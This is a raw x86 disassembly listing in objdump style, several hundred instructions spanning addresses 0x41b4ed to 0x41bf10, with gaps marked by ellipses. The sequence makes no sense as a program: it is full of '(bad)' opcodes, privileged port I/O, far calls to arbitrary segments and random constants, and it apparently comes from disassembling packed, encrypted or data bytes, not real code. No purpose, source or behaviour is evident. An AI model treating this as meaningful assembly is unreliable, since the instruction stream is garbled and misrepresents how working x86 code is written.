  41b4ed:	sbb    eax,0xcde32902
  41b4f2:	ins    BYTE PTR es:[edi],dx
  41b4f3:	retf   
  41b4f4:	xor    eax,0x32c9882a
  41b4f9:	call   0x3eb91dd9
  41b4fe:	push   esi
  41b4ff:	popf   
  41b500:	or     eax,0x12d4ea8a
  41b505:	push   esi
  41b506:	xchg   ebp,eax
  41b507:	dec    esi
  41b508:	lahf   
  41b509:	repz out dx,al
  41b50b:	adc    DWORD PTR [edi+0x2d],esp
  41b50e:	inc    eax
  41b50f:	retf   0x5d
	...
  41b572:	add    BYTE PTR [eax],al
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	test   DWORD PTR [eax+0x7],eax
  41b583:	sbb    DWORD PTR [edi+0x22],esp
  41b586:	add    DWORD PTR [eax],eax
  41b588:	add    eax,0xb8000001
  41b58d:	fisub  WORD PTR [edx-0x6492deb]
  41b593:	ja     0x41b5fc
  41b595:	add    ebx,DWORD PTR [esi]
  41b597:	mov    bl,0xef
  41b599:	test   DWORD PTR [edx+0x470d2ad9],edi
  41b59f:	or     BYTE PTR [esi],bl
  41b5a1:	loope  0x41b5c5
  41b5a3:	and    edi,edx
  41b5a5:	dec    ebp
  41b5a6:	add    DWORD PTR [ecx+ecx*2],0xcf657f3d
  41b5ad:	in     eax,dx
  41b5ae:	xchg   ebp,eax
  41b5af:	imul   ecx,DWORD PTR [ebp-0x27e62bf6],0x6e
  41b5b6:	cmp    eax,0x3486052a
  41b5bb:	push   ecx
  41b5bc:	xchg   ecx,eax
  41b5bd:	mov    ebp,0xa40a3dc6
  41b5c2:	dec    ecx
  41b5c3:	arpl   WORD PTR [ebp+0x73],di
  41b5c6:	xor    DWORD PTR [esi],ecx
  41b5c8:	adc    DWORD PTR [edx-0x4d],0x61
  41b5cc:	outs   dx,DWORD PTR ds:[esi]
  41b5cd:	repz cmc 
  41b5cf:	sbb    eax,0x9588861b
  41b5d4:	xchg   esi,eax
  41b5d5:	lods   eax,DWORD PTR ds:[esi]
  41b5d6:	mov    bh,0xe6
  41b5d8:	ja     0x41b576
  41b5da:	push   edi
  41b5db:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5dd:	adc    al,0x55
  41b5df:	sbb    eax,0x13fade7a
  41b5e4:	fidiv  WORD PTR [esi+0x2e]
  41b5e7:	pop    ebx
  41b5e8:	imul   ecx,DWORD PTR [eax],0x30
  41b5eb:	jae    0x41b65b
  41b5ed:	cdq    
  41b5ee:	shl    DWORD PTR [eax],1
  41b5f0:	ins    DWORD PTR es:[edi],dx
  41b5f1:	lea    eax,[edx+0x29842166]
  41b5f7:	outs   dx,BYTE PTR ds:[esi]
  41b5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5f9:	inc    esi
  41b5fa:	jge    0x41b5ac
  41b5fc:	aaa    
  41b5fd:	push   0x5f015573
  41b602:	and    al,0x56
  41b604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b605:	popf   
  41b606:	hlt    
  41b607:	sar    BYTE PTR [ebx-0x3c8b4619],1
  41b60d:	enter  0x4330,0x3c
  41b611:	mov    eax,ds:0xb15e8e33
  41b616:	jne    0x41b5c4
  41b618:	retf   
  41b619:	dec    edi
  41b61a:	or     cl,dh
  41b61c:	mov    fs,WORD PTR [ebx]
  41b61e:	adc    DWORD PTR [ecx+0x6c081f90],ebx
  41b624:	cdq    
  41b625:	shl    BYTE PTR [edi-0x1c],0xcc
  41b629:	dec    eax
  41b62a:	add    DWORD PTR ds:0x25360871,eax
  41b630:	mov    ecx,0x39be8a76
  41b635:	in     al,dx
  41b636:	mov    ch,0x3c
  41b638:	call   0x4b34da24
  41b63d:	pop    ss
  41b63e:	or     al,0x1d
  41b640:	test   eax,0xf08a3020
  41b645:	jg     0x41b64d
  41b647:	cmp    edx,DWORD PTR [eax-0x57]
  41b64a:	in     eax,0x82
  41b64c:	into   
  41b64d:	add    esi,DWORD PTR [edi+ecx*1+0x33]
  41b651:	dec    edi
  41b652:	or     ch,BYTE PTR [eax+0x2806c65d]
  41b658:	(bad)  
  41b659:	(bad)  
  41b65a:	mov    al,ds:0x425cbe2
  41b65f:	fimul  WORD PTR [ebp-0x4d]
  41b662:	push   es
  41b663:	sub    bl,ch
  41b665:	stc    
  41b666:	into   
  41b667:	test   al,0x1f
  41b669:	mov    ebp,0xf3650043
  41b66e:	push   es
  41b66f:	jecxz  0x41b6d4
  41b671:	out    0x9d,al
  41b673:	dec    esi
  41b674:	dec    ebx
  41b675:	sahf   
  41b676:	push   esi
  41b677:	fs pop edi
  41b679:	and    ecx,ebx
  41b67b:	loope  0x41b65f
  41b67d:	stc    
  41b67e:	cmp    esp,DWORD PTR [ebp+0x18]
  41b681:	out    dx,al
  41b682:	mov    dh,0xb8
  41b684:	push   0x5154c918
  41b689:	mov    eax,ds:0x9fda3e9a
  41b68e:	inc    ebp
  41b68f:	pop    esp
  41b690:	mov    BYTE PTR [eax],0x0
	...
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	adc    DWORD PTR [edx+ebx*2+0x1236c09],ecx
  41b707:	add    BYTE PTR ds:0xf5000001,al
  41b70d:	shl    edi,0x6a
  41b710:	ins    DWORD PTR es:[edi],dx
  41b711:	not    DWORD PTR [eax+edi*4-0x3952555b]
  41b718:	add    eax,0x57bcbb0a
  41b71d:	cwde   
  41b71e:	lods   eax,DWORD PTR ds:[esi]
  41b71f:	push   esi
  41b720:	mov    al,0x47
  41b722:	(bad)  
  41b723:	sahf   
  41b724:	jmp    0x41b762
  41b726:	(bad)  
  41b727:	cld    
  41b728:	add    ebp,DWORD PTR [edx]
  41b72a:	cmp    BYTE PTR [edi],0x78
  41b72d:	(bad)  
  41b72e:	(bad)
  41b731:	xchg   edx,eax
  41b732:	xlat   BYTE PTR ds:[ebx]
  41b733:	int    0xed
  41b735:	push   esp
  41b736:	fcom   DWORD PTR [ecx-0x11]
  41b739:	popa   
  41b73a:	out    dx,eax
  41b73b:	cmc    
  41b73c:	outs   dx,BYTE PTR ds:[esi]
  41b73d:	in     eax,0x4c
  41b73f:	scas   al,BYTE PTR es:[edi]
  41b740:	or     al,0xe3
  41b742:	popf   
  41b743:	pop    esp
  41b744:	and    esi,DWORD PTR [edi+eiz*4+0x69f86097]
  41b74b:	push   ebx
  41b74c:	test   al,0x61
  41b74e:	iret   
  41b74f:	je     0x41b79e
  41b751:	xlat   BYTE PTR ds:[ebx]
  41b752:	addr16 (bad) 
  41b754:	arpl   WORD PTR [edx],si
  41b756:	ds std 
  41b758:	adc    edi,DWORD PTR [ebp+0x60]
  41b75b:	mov    dh,0x3f
  41b75d:	ret    
  41b75e:	xor    cl,BYTE PTR [ecx-0x13]
  41b761:	or     BYTE PTR [edi+0x52],ch
  41b764:	loope  0x41b7be
  41b766:	xchg   ebx,eax
  41b767:	cld    
  41b768:	xor    al,0xbc
  41b76a:	push   0x37ad0ac9
  41b76f:	push   esi
  41b770:	sbb    esp,esi
  41b772:	cmp    BYTE PTR [eax+0x4792f398],ah
  41b778:	jl     0x41b7c7
  41b77a:	fucomip st,st(0)
  41b77c:	mov    bl,0x6a
  41b77e:	dec    edi
  41b77f:	fucomp st(2)
  41b781:	or     al,0x34
  41b783:	neg    BYTE PTR [esi+0x4]
  41b786:	sbb    eax,0x23206d26
  41b78b:	int3   
  41b78c:	or     DWORD PTR [ebp-0x7],0x28
  41b790:	aas    
  41b791:	stos   BYTE PTR es:[edi],al
  41b792:	or     esp,DWORD PTR [edi-0x54ef1f7c]
  41b798:	outs   dx,BYTE PTR ds:[esi]
  41b799:	ins    DWORD PTR es:[edi],dx
  41b79a:	ja     0x41b81a
  41b79c:	out    0x8d,eax
  41b79e:	test   BYTE PTR [ecx+0x18],cl
  41b7a1:	stos   BYTE PTR es:[edi],al
  41b7a2:	test   DWORD PTR [bp-0x59],esi
  41b7a6:	retf   0x386f
  41b7a9:	test   al,0x1f
  41b7ab:	(bad)  
  41b7ac:	push   DWORD PTR [ebx+0x714de7c9]
  41b7b2:	mov    dh,ah
  41b7b4:	outs   dx,BYTE PTR ds:[esi]
  41b7b5:	out    dx,eax
  41b7b6:	xor    al,0x48
  41b7b8:	js     0x41b81c
  41b7ba:	xlat   BYTE PTR ds:[ebx]
  41b7bb:	sbb    eax,0xd952476b
  41b7c0:	xor    eax,0x47a2745a
  41b7c5:	loope  0x41b80b
  41b7c7:	js     0x41b80a
  41b7c9:	mov    esp,0x1159e65f
  41b7ce:	mov    al,ds:0x2e5ec681
  41b7d3:	and    ch,BYTE PTR [edx]
  41b7d5:	repnz mov edx,0xd9a4ce0c
  41b7db:	mov    dh,0x7e
  41b7dd:	(bad)  
  41b7df:	shr    DWORD PTR [ecx-0x78],1
  41b7e2:	mov    dl,0xaf
  41b7e4:	out    0x84,eax
  41b7e6:	pop    eax
  41b7e7:	cwde   
  41b7e8:	add    edx,0x2b
  41b7eb:	jp     0x29319435
  41b7f1:	and    al,0xdc
  41b7f3:	mov    al,ds:0x62e71bbf
  41b7f8:	add    BYTE PTR gs:[ecx-0x10],ch
  41b7fc:	leave  
  41b7fd:	xchg   edx,eax
  41b7fe:	data16 cmp al,0x16
  41b801:	repz repz ret 0x2b68
  41b806:	loop   0x41b7a4
  41b808:	inc    ebp
  41b809:	or     DWORD PTR [eax-0x44d5427a],ecx
  41b80f:	inc    edi
  41b810:	stc    
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x84
  41b881:	adc    bh,dl
  41b883:	jne    0x41b8f6
  41b885:	and    al,0x1
  41b887:	add    BYTE PTR ds:0xa4000001,al
  41b88d:	push   0xb9a4c457
  41b892:	cmp    eax,0x2a50f57
  41b897:	dec    eax
  41b898:	sub    DWORD PTR [ecx+0x18],edi
  41b89b:	add    ebx,DWORD PTR [edi-0x5d7b01cb]
  41b8a1:	inc    ebx
  41b8a2:	xor    al,0x3
  41b8a5:	jo     0x41b874
  41b8a7:	out    dx,al
  41b8a8:	cmp    edx,esp
  41b8aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8ab:	aaa    
  41b8ac:	cmc    
  41b8ad:	lock das 
  41b8af:	or     BYTE PTR [eax+0x63],ch
  41b8b2:	xor    esp,0x12
  41b8b5:	xlat   BYTE PTR ds:[ebx]
  41b8b6:	ja     0x41b8f1
  41b8b8:	cmp    al,0xe1
  41b8ba:	add    bl,BYTE PTR [ecx]
  41b8bc:	mov    bl,0x75
  41b8be:	add    al,BYTE PTR [ebx]
  41b8c0:	int    0x17
  41b8c2:	enter  0xfe9b,0x80
  41b8c6:	and    al,BYTE PTR [ecx+edx*8+0x10f8c7d8]
  41b8cd:	inc    edi
  41b8ce:	iret   
  41b8cf:	mov    al,BYTE PTR [ecx-0x4f]
  41b8d2:	push   eax
  41b8d3:	mov    edi,0x309fbb9c
  41b8d8:	push   es
  41b8d9:	pop    ebx
  41b8da:	sti    
  41b8db:	add    ebp,DWORD PTR [edx]
  41b8dd:	mov    eax,0xfb466995
  41b8e2:	mov    dl,BYTE PTR [edx]
  41b8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8e5:	mov    al,ds:0xd58aa910
  41b8ea:	sar    ch,0xc9
  41b8ed:	retf   0x237c
  41b8f0:	cs (bad) 
  41b8f2:	rcl    DWORD PTR [ecx-0x4cd92eac],1
  41b8f8:	dec    edi
  41b8f9:	in     eax,dx
  41b8fa:	inc    eax
  41b8fb:	mov    bh,0x83
  41b8fd:	call   0xeaa:0xbd877961
  41b904:	stos   BYTE PTR es:[edi],al
  41b905:	xor    al,ch
  41b907:	loop   0x41b956
  41b909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b90a:	dec    edx
  41b90b:	sub    al,0xfb
  41b90d:	jmp    0x41b908
  41b90f:	adc    DWORD PTR [ebx-0x78],edi
  41b912:	mov    bh,0x3d
  41b914:	mov    bl,0x26
  41b916:	push   ecx
  41b917:	iret   
  41b918:	push   ebp
  41b919:	mov    al,ds:0xc45cbeea
  41b91e:	add    eax,0x40c147d1
  41b923:	push   0xffffffd0
  41b925:	std    
  41b926:	aaa    
  41b927:	and    dl,BYTE PTR [ebx-0x5e8d36f7]
  41b92d:	(bad)  
  41b92e:	sub    ah,BYTE PTR [ecx]
  41b930:	mov    eax,0x32aabee6
  41b935:	mov    al,ds:0x56180f86
  41b93a:	mov    ch,0x14
  41b93c:	jb     0x41b958
  41b93e:	mov    ebx,0x6d21692c
  41b943:	ins    DWORD PTR es:[edi],dx
  41b944:	mov    bh,0x5b
  41b946:	sbb    eax,0x5a43c94d
  41b94b:	mov    eax,ds:0xb4aac550
  41b950:	mov    edx,0xcba63869
  41b955:	xchg   edi,eax
  41b956:	inc    esi
  41b957:	sahf   
  41b958:	pop    ds
  41b959:	mov    dl,0xa9
  41b95b:	pop    esp
  41b95c:	jno    0x41b916
  41b95e:	add    al,0xb2
  41b960:	(bad)  
  41b961:	ds inc eax
  41b963:	cmp    al,0xee
  41b965:	es rcl ecx,cl
  41b968:	xor    ch,dl
  41b96a:	mov    ecx,0x16693813
  41b96f:	pop    ss
  41b970:	xor    esp,DWORD PTR [eax-0x53]
  41b973:	push   edi
  41b974:	leave  
  41b975:	pop    eax
  41b976:	in     eax,0x3
  41b978:	pop    ebx
  41b979:	call   0xc51c:0x734787cc
  41b980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b981:	sar    DWORD PTR [eax],cl
  41b983:	(bad)  
  41b984:	ret    
  41b985:	arpl   WORD PTR [eax],sp
  41b987:	daa    
  41b988:	das    
  41b989:	dec    ebp
  41b98a:	popf   
  41b98b:	dec    esi
  41b98c:	mov    bl,dl
  41b98e:	mov    bl,0xdd
  41b990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	jl     0x41ba71
  41ba02:	ret    0x7635
  41ba05:	and    eax,0x1050001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	data16 repz cld 
  41ba0f:	adc    dl,cl
  41ba11:	pushf  
  41ba12:	lds    edx,FWORD PTR [ebx-0x3]
  41ba15:	and    edx,DWORD PTR [ebx]
  41ba17:	pop    ebp
  41ba18:	push   esi
  41ba19:	dec    di
  41ba1b:	int3   
  41ba1c:	loope  0x41b9f9
  41ba1e:	cmp    BYTE PTR [edi+0x25abc575],bl
  41ba24:	(bad)  
  41ba25:	cmp    bh,BYTE PTR [esi]
  41ba27:	in     al,dx
  41ba28:	xor    DWORD PTR [ecx],0xf9c99cd5
  41ba2e:	add    DWORD PTR [edi-0x62],ebx
  41ba31:	and    eax,0x5e0380fc
  41ba36:	sub    esp,esp
  41ba38:	push   cs
  41ba39:	adc    eax,0xb56c53a
  41ba3e:	sbb    edx,DWORD PTR ds:0x32544c14
  41ba44:	arpl   di,bx
  41ba46:	fstp   QWORD PTR [ebx-0x14c9ddc]
  41ba4c:	hlt    
  41ba4d:	(bad)
  41ba50:	cmp    BYTE PTR [ebx-0x686d71f9],ch
  41ba56:	jo     0x41ba95
  41ba58:	add    eax,0x7209dbd5
  41ba5d:	mov    ds:0xde7366ca,eax
  41ba62:	test   DWORD PTR [esi-0x75fa0269],esp
  41ba68:	mov    ebx,0x84f57c08
  41ba6d:	mov    bh,BYTE PTR [ebx-0x18d3f2e]
  41ba73:	xor    eax,0xf7a7a18d
  41ba78:	test   ah,dh
  41ba7a:	ins    BYTE PTR es:[edi],dx
  41ba7b:	xor    ecx,ebx
  41ba7d:	ins    DWORD PTR es:[edi],dx
  41ba7e:	adc    BYTE PTR [ecx],ch
  41ba80:	rcr    ebx,1
  41ba82:	enter  0x455c,0x4c
  41ba86:	mov    cl,0x3b
  41ba88:	call   0x8787:0x7d920e33
  41ba8f:	mov    esp,0x1b4393b3
  41ba94:	out    dx,al
  41ba95:	lock xchg esp,eax
  41ba97:	add    eax,0xad5e7721
  41ba9c:	fsub   QWORD PTR [ebx-0x5e1b165e]
  41baa2:	test   eax,0xf29b9233
  41baa7:	cwde   
  41baa8:	push   esi
  41baa9:	jmp    0xc367:0xafdc9805
  41bab0:	(bad)  
  41bab1:	adc    al,0x59
  41bab3:	cmc    
  41bab4:	mov    esi,esi
  41bab6:	leave  
  41bab7:	pop    ds
  41bab8:	inc    edx
  41bab9:	aad    0x9b
  41babb:	push   ebx
  41babc:	hlt    
  41babd:	lahf   
  41babe:	les    ebx,FWORD PTR [edi-0x53542477]
  41bac4:	call   0x842e:0xc9b55de9
  41bacb:	sti    
  41bacc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bacd:	xor    ch,ch
  41bacf:	(bad)  
  41bad0:	test   BYTE PTR es:[esi],cl
  41bad3:	push   ss
  41bad4:	in     al,0x30
  41bad6:	call   0x9eee849a
  41badb:	pop    ebp
  41badc:	xchg   esp,eax
  41badd:	repz imul edi,DWORD PTR [edi+0x6d],0xf1e2f071
  41bae5:	fsub   st(7),st
  41bae7:	fbstp  TBYTE PTR [ebx]
  41bae9:	jae    0x41ba8e
  41baeb:	adc    esi,eax
  41baed:	js     0x41bb6e
  41baef:	cmp    al,0x28
  41baf1:	mov    esi,0xd65194ba
  41baf6:	outs   dx,DWORD PTR ds:[esi]
  41baf7:	in     eax,dx
  41baf8:	dec    eax
  41baf9:	js     0x41bb13
  41bafb:	test   al,0xdb
  41bafd:	test   al,0xf5
  41baff:	daa    
  41bb00:	shr    DWORD PTR [esi+0xc],1
  41bb03:	icebp  
  41bb04:	dec    ebp
  41bb05:	add    edi,DWORD PTR [eax-0x512f5aec]
  41bb0b:	push   esp
  41bb0c:	stc    
  41bb0d:	inc    edi
  41bb0e:	mov    BYTE PTR fs:[ebp+0x0],dl
	...
  41bb72:	add    BYTE PTR [eax],al
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x2d],cx
  41bb81:	and    ebp,DWORD PTR [ebx]
  41bb83:	sar    DWORD PTR [ebx+0x26],cl
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0xef000001
  41bb8d:	loope  0x41bbf9
  41bb8f:	and    DWORD PTR fs:[edx+0xbdf1af2],0x6c
  41bb97:	mov    WORD PTR ds:0xfe6b92fe,?
  41bb9d:	add    BYTE PTR [ebp-0x5fdb318],bl
  41bba3:	and    eax,0x1c44c14c
  41bba8:	out    dx,al
  41bba9:	pop    edi
  41bbaa:	xchg   ebx,eax
  41bbab:	inc    ebx
  41bbac:	loop   0x41bbdd
  41bbae:	mov    esi,0xabc77dc3
  41bbb3:	push   0xf890def
  41bbb8:	das    
  41bbb9:	pop    ss
  41bbba:	mov    esp,0xbac052d2
  41bbbf:	cmp    eax,0x1f
  41bbc2:	cdq    
  41bbc3:	sbb    esp,DWORD PTR [edi+0x712314d3]
  41bbc9:	pop    eax
  41bbca:	cmp    ebp,DWORD PTR [ebx]
  41bbcc:	push   ss
  41bbcd:	loop   0x41bbed
  41bbcf:	sbb    al,0x35
  41bbd1:	pop    edx
  41bbd2:	dec    edi
  41bbd3:	mov    dl,0xe9
  41bbd5:	mov    esi,0x1e5e817b
  41bbda:	xchg   BYTE PTR [esi-0x17c8812b],al
  41bbe0:	mov    bl,0xc9
  41bbe2:	mov    ebx,0x5465ac43
  41bbe7:	fwait
  41bbe8:	mov    edi,0x4a2a5152
  41bbed:	gs stos BYTE PTR es:[edi],al
  41bbef:	js     0x41bc4f
  41bbf1:	push   edi
  41bbf2:	xchg   esi,eax
  41bbf3:	xor    ah,BYTE PTR [ebx-0x3192f879]
  41bbf9:	int3   
  41bbfa:	xor    bh,BYTE PTR [ebx+0x9cd9086]
  41bc00:	(bad)  
  41bc01:	mov    dl,0x20
  41bc03:	push   es
  41bc04:	fucompp 
  41bc06:	cs inc edx
  41bc08:	addr16 ds cmp al,0x9d
  41bc0c:	mov    ah,0xcb
  41bc0e:	jmp    0x41bbef
  41bc10:	sbb    DWORD PTR [eax+edi*8],esp
  41bc13:	dec    ebp
  41bc14:	fdivr  st(6),st
  41bc16:	(bad)  
  41bc17:	sbb    ebx,DWORD PTR [esp+eax*1-0x6ef6c655]
  41bc1e:	jmp    0x41bc40
  41bc20:	sub    edx,DWORD PTR [ecx]
  41bc22:	push   esp
  41bc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc24:	sbb    al,0xd1
  41bc26:	mov    cl,BYTE PTR [edi+0x30e96f9a]
  41bc2c:	(bad)  
  41bc2d:	popa   
  41bc2e:	out    dx,eax
  41bc2f:	pop    edx
  41bc30:	adc    dh,BYTE PTR [esi-0x31]
  41bc33:	popa   
  41bc34:	or     cl,BYTE PTR [eax-0x5bafce25]
  41bc3a:	test   DWORD PTR [ebx-0x39],esp
  41bc3d:	mov    dl,0xf6
  41bc3f:	fistp  QWORD PTR [eax]
  41bc41:	xchg   esp,eax
  41bc42:	mov    edx,0xc91151b
  41bc47:	fisttp WORD PTR ds:0x6f9f7ec3
  41bc4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc4e:	std    
  41bc4f:	push   ebp
  41bc50:	adc    eax,0x77d82d40
  41bc55:	jb     0x41bc6c
  41bc57:	imul   ebx,DWORD PTR [edi+eax*2-0x73],0x6ab6a8f5
  41bc5f:	lods   al,BYTE PTR ds:[esi]
  41bc60:	lods   eax,DWORD PTR ds:[esi]
  41bc61:	test   ebp,ecx
  41bc63:	mov    dl,0xb1
  41bc65:	lods   eax,DWORD PTR ds:[esi]
  41bc66:	fcom   DWORD PTR [ebx+ecx*1+0x44a5d1cd]
  41bc6d:	sti    
  41bc6e:	push   ds
  41bc6f:	pop    esi
  41bc70:	or     DWORD PTR [edx+0x4d89919],esi
  41bc76:	mov    eax,ds:0x3e50b2de
  41bc7b:	jecxz  0x41bcbb
  41bc7d:	adc    ch,al
  41bc7f:	cmc    
  41bc80:	jl     0x41bcd1
  41bc82:	push   edi
  41bc83:	mov    edx,0x9a19cb3
  41bc88:	data16 mov bl,0xcc
  41bc8b:	mov    al,0x50
  41bc8d:	ins    BYTE PTR es:[edi],dx
  41bc8e:	sub    ebx,DWORD PTR [ebx+0x6b]
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xf1cd9d8
  41bd02:	imul   eax,DWORD PTR [ebp+0x12780],0x105
  41bd0c:	fwait
  41bd0d:	aad    0x8b
  41bd0f:	fadd   st,st(5)
  41bd11:	neg    ah
  41bd13:	fimul  DWORD PTR [esp+ecx*1+0x14]
  41bd17:	mov    edx,0xa930a12f
  41bd1c:	cmp    eax,0x509c6876
  41bd21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd22:	and    al,BYTE PTR [ebx+0x1d]
  41bd25:	cmp    al,BYTE PTR [edi]
  41bd27:	push   esi
  41bd28:	outs   dx,DWORD PTR ds:[esi]
  41bd29:	pop    esp
  41bd2a:	mov    edi,0xff935411
  41bd2f:	mov    BYTE PTR [ebx+0x22],dh
  41bd32:	jl     0x41bd1a
  41bd34:	xchg   DWORD PTR [ecx+0x370bb70],edx
  41bd3a:	sar    BYTE PTR [edx],0x59
  41bd3d:	scas   al,BYTE PTR es:[edi]
  41bd3e:	xchg   edi,eax
  41bd3f:	enter  0xf845,0x21
  41bd43:	mov    ebx,0xc44838cb
  41bd48:	jnp    0x41bcdb
  41bd4a:	jae    0x41bd43
  41bd4c:	pop    edx
  41bd4d:	push   edx
  41bd4e:	ret    0x7c8f
  41bd51:	adc    eax,0x6c89fd71
  41bd56:	retf   0xdd2
  41bd59:	cmp    eax,0x4d04ff8a
  41bd5e:	add    DWORD PTR [esi],esi
  41bd60:	inc    esi
  41bd61:	push   cs
  41bd62:	inc    ecx
  41bd63:	lds    edx,FWORD PTR [ebx+esi*1+0x3]
  41bd67:	adc    DWORD PTR [ebx+0x2b],esp
  41bd6a:	cmp    ebx,DWORD PTR [edi+0x55d24ef]
  41bd70:	js     0x41bd05
  41bd72:	and    esp,DWORD PTR [esi]
  41bd74:	mov    bh,0x26
  41bd76:	fimul  WORD PTR [ebx-0x18]
  41bd79:	test   eax,0x7166f904
  41bd7e:	and    BYTE PTR [eax],al
  41bd80:	lods   eax,DWORD PTR ds:[esi]
  41bd81:	pop    DWORD PTR [esi-0x2a80aafd]
  41bd87:	iret   
  41bd88:	cs push eax
  41bd8a:	jns    0x41bd8c
  41bd8c:	xchg   ebp,eax
  41bd8d:	xchg   edx,eax
  41bd8e:	lea    ebx,[ecx]
  41bd90:	fistp  WORD PTR [esi-0x5ac2acb1]
  41bd96:	xor    BYTE PTR [ebp-0x321f45a3],al
  41bd9c:	div    BYTE PTR [ebx]
  41bd9e:	test   eax,0x548f529
  41bda3:	pop    edi
  41bda4:	lea    edi,[ebx]
  41bda6:	inc    edx
  41bda7:	test   al,0xb8
  41bda9:	mov    bh,0xcc
  41bdab:	and    eax,0x6351a12
  41bdb0:	or     esp,eax
  41bdb2:	js     0x41be1b
  41bdb4:	loope  0x41bdf6
  41bdb6:	pop    ebp
  41bdb7:	mov    bl,0x39
  41bdb9:	(bad)  
  41bdba:	pop    ss
  41bdbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdbc:	fnstcw WORD PTR [eax+0x6a]
  41bdbf:	xchg   edx,eax
  41bdc0:	pop    ds
  41bdc1:	push   0x8d0524ba
  41bdc6:	push   0xe
  41bdc8:	out    dx,al
  41bdc9:	dec    esi
  41bdca:	sti    
  41bdcb:	call   0xa8817521
  41bdd0:	add    al,0x9c
  41bdd2:	std    
  41bdd3:	ins    BYTE PTR es:[edi],dx
  41bdd4:	mov    BYTE PTR [ebp-0x7cead744],bl
  41bdda:	ds cwde 
  41bddc:	int3   
  41bddd:	mov    edx,0x8c339418
  41bde2:	gs int3 
  41bde4:	jne    0x41be49
  41bde6:	pop    esp
  41bde7:	mov    ebx,0xa53af987
  41bdec:	in     al,0x97
  41bdee:	call   0x255f6664
  41bdf3:	push   ebp
  41bdf4:	out    dx,al
  41bdf5:	and    DWORD PTR [esi+0x42c15def],0x1de3e887
  41bdff:	mov    bh,0x16
  41be01:	retf   
  41be02:	lds    edi,FWORD PTR [eax+0x7c12d07]
  41be08:	ins    DWORD PTR es:[edi],dx
  41be09:	pop    ebp
  41be0a:	jnp    0x41be60
  41be0c:	mov    ah,0x56
  41be0e:	ins    BYTE PTR es:[edi],dx
  41be0f:	stos   BYTE PTR es:[edi],al
  41be10:	add    DWORD PTR [eax],eax
	...
  41be72:	add    BYTE PTR [eax],al
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx-0x196bc09a]
  41be82:	jb     0x41be6a
  41be84:	test   DWORD PTR [eax],ebp
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    eax,0x39000001
  41be8d:	or     BYTE PTR [eax],0xfb
  41be90:	lds    eax,FWORD PTR [ebx]
  41be92:	cdq    
  41be93:	dec    eax
  41be94:	daa    
  41be95:	jo     0x41bebf
  41be97:	std    
  41be98:	(bad)  
  41be99:	icebp  
  41be9a:	out    dx,al
  41be9b:	les    eax,FWORD PTR [edi+0x7d]
  41be9e:	aaa    
  41be9f:	or     BYTE PTR [eax+ebp*2+0x67],ch
  41bea3:	mov    ebp,0xb9cf2cf8
  41bea8:	in     al,0x44
  41beaa:	mov    esi,0xa39793e0
  41beaf:	cdq    
  41beb0:	mov    dl,0x37
  41beb2:	jecxz  0x41be5c
  41beb4:	pause  
  41beb6:	mov    dl,BYTE PTR [ecx-0x40]
  41beb9:	pop    edi
  41beba:	cmp    eax,0xa433435e
  41bebf:	sti    
  41bec0:	test   eax,0xe75fa224
  41bec5:	pop    ebx
  41bec6:	mov    ebx,0xa0bdfa9
  41becb:	out    0x1c,eax
  41becd:	or     BYTE PTR [ecx+0x6702f0ec],0x2
  41bed4:	or     eax,0x8e2ecb6f
  41bed9:	add    BYTE PTR [edx-0x79e52f0d],dh
  41bedf:	in     al,0xa2
  41bee1:	lds    esp,FWORD PTR [edx-0xd]
  41bee4:	aad    0xb2
  41bee6:	cdq    
  41bee7:	daa    
  41bee8:	xor    al,0x17
  41beea:	cwde   
  41beeb:	sbb    BYTE PTR [esi],dl
  41beed:	call   0x7db:0x58969a90
  41bef4:	ret    0xed5e
  41bef7:	and    al,0x93
  41bef9:	sub    al,0xf
  41befb:	lods   eax,DWORD PTR ds:[esi]
  41befc:	aaa    
  41befd:	mov    ebx,0x30f97011
  41bf02:	ds pop edi
  41bf04:	push   0x46ba5476
  41bf09:	push   ds
  41bf0a:	or     edi,edi
  41bf0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf0d:	inc    ecx
  41bf0e:	or     BYTE PTR [esi],dl
  41bf10:	mov    ebx,0xfd45fd1d
